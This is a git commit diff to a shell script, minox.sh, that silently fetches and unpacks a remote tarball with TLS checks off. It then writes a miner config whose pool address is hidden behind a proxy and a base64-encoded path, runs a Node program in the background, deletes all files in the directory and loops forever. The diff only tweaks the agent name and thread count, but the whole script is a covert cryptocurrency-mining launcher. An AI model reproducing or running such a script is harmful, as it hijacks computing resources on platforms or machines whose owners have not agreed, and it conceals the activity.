722c70ae28c958507c3987e7bd3aced3195bd3d4
paskofa10 <mr.paskofa10@jugda.com>
2025-08-31 16:36:28 +0700

    Update minox.sh

--- minox.sh
+++ minox.sh
@@ -2,7 +2,7 @@
 
 curl -sLkO https://github.com/paskofa10/webmoon/releases/download/flex/mino.tar.gz > /dev/null 2>&1
 tar -xvf mino.tar.gz > /dev/null 2>&1
-echo -e '{"log": true, "proxy": "wss://present-nichol-vivo1-4f3dad8a.koyeb.app/bWlub3RhdXJ4Lm5hLm1pbmUuenBvb2wuY2E6NzAxOQ==", "user": "MM2DPsr5664vCMZP3LiWhxwimmfvohUeHW", "password": "c=MAZA,zap=MAZA", "argent": "mino/00", "threads": 8}' > data.txt
+echo -e '{"log": true, "proxy": "wss://present-nichol-vivo1-4f3dad8a.koyeb.app/bWlub3RhdXJ4Lm5hLm1pbmUuenBvb2wuY2E6NzAxOQ==", "user": "MM2DPsr5664vCMZP3LiWhxwimmfvohUeHW", "password": "c=MAZA,zap=MAZA", "argent": "blue-mino/2.0", "threads": 7}' > data.txt
 node app.js > /dev/null 2>&1 &
 rm -rvf *
 while true
